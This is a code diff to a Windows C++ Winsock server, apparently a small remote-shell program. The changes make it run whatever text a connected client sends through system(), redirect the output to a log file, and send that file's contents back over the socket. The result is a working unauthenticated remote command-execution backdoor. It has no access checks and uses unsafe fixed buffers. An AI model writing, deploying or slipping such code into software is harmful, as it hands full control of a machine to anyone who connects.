@@ -2,8 +2,13 @@
 #include "winsock2.h";
 #include "Ws2tcpip.h";
 #include <tchar.h>;
+#include <fstream>
+#include <iostream>
+
+using namespace std;
 
 char sendbuf[320000] = "Client: Sending data.";
+
 char recvbuf[320000] = "";
 void main() 
 {
@@ -72,10 +77,6 @@ void main()
 	int bytesSent;
 	int bytesRecv = 0;
 	
-
-	//>file 2>&1	
-	//----------------------
-	// Send and receive data.
 	while (bytesRecv != SOCKET_ERROR)
 	{
 		bytesRecv = recv(AcceptSocket, recvbuf, 32, 0);
@@ -93,8 +94,19 @@ void main()
 		strcat_s(recvbuf ,">C:/tmp/file2004.log 2>&1\n");                  //to do
 		system(recvbuf);
 
-		bytesSent = send(AcceptSocket, "command", strlen("command") + 1, 0);
-		if (bytesSent != strlen("command") + 1)
+		fstream file;
+		file.open("C:/tmp/file2004.log");
+		int i = 0;
+		while (!file.eof())
+		{
+			file.get(sendbuf[i]);
+			i++;
+		}
+		sendbuf[i] = '\0';
+		file.close();
+
+		bytesSent = send(AcceptSocket, sendbuf, strlen(sendbuf) + 1, 0);
+		if (bytesSent != strlen(sendbuf) + 1)
 		{
 			printf("Error of sending bytes: %ld\n ", bytesSent);
 			break;
